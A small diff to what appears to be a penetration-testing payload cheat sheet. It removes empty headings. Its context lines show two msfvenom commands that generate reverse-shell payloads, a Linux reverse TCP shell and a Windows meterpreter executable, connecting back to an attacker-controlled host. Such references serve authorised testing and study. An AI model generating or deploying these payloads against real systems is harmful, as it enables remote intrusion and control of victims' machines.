@@ -63,16 +63,6 @@ $msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LOCALIP LPORT=443 -o non-staged.
 $msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALIP LPORT=443 -f exe -o meterpreter.exe
 ```
 
-###
-
-###
-
-###
-
-###
-
-###
-
 ### C payloads
 
 ```
